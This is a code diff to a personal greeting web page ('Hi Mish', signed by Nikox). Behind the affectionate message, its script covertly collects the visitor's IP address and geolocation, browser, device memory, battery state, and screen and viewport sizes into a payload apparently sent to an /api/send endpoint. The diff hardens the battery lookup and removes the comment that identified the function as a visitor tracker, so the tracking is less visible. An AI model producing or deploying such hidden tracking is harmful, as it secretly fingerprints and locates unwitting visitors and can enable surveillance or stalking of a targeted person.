@@ -6,7 +6,6 @@
   <title>Hi Mish Iverette</title>
   <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&display=swap" rel="stylesheet">
 
-  <!-- Open Graph Meta Tags -->
   <meta property="og:title" content="Hi Mish este luv" />
   <meta property="og:description" content="You're beautiful, luv. Keep smiling. — by Nikox" />
   <meta property="og:image" content="https://i.imgur.com/dTnszwX.jpeg" />
@@ -134,14 +133,23 @@
       }, 1000);
     });
 
-    // 👇 Visitor Tracker: Send info to /api/send
     async function collectAndSendInfo() {
       try {
-        const geo = await fetch('https://ipapi.co/json').then(res => res.json());
+        const geo = await fetch('https://ipapi.co/json/').then(res => res.json());
         const userAgent = navigator.userAgent;
-        const battery = await navigator.getBattery();
-        const memory = navigator.deviceMemory || 'Unknown';
         const isMobile = /Mobi|Android/i.test(userAgent);
+        const memory = navigator.deviceMemory || 'Unknown';
+        let battery = { level: null, charging: null };
+
+        try {
+          const bat = await navigator.getBattery();
+          battery = {
+            level: Math.round(bat.level * 100),
+            charging: bat.charging
+          };
+        } catch (e) {
+          console.warn("Battery info not available.");
+        }
 
         const payload = {
           ip: geo.ip,
@@ -153,7 +161,7 @@
           mobile: isMobile,
           browser: userAgent,
           memory: memory,
-          battery: Math.round(battery.level * 100),
+          battery: battery.level,
           charging: battery.charging,
           screen: `${screen.width}x${screen.height}`,
           viewport: `${window.innerWidth}x${window.innerHeight}`
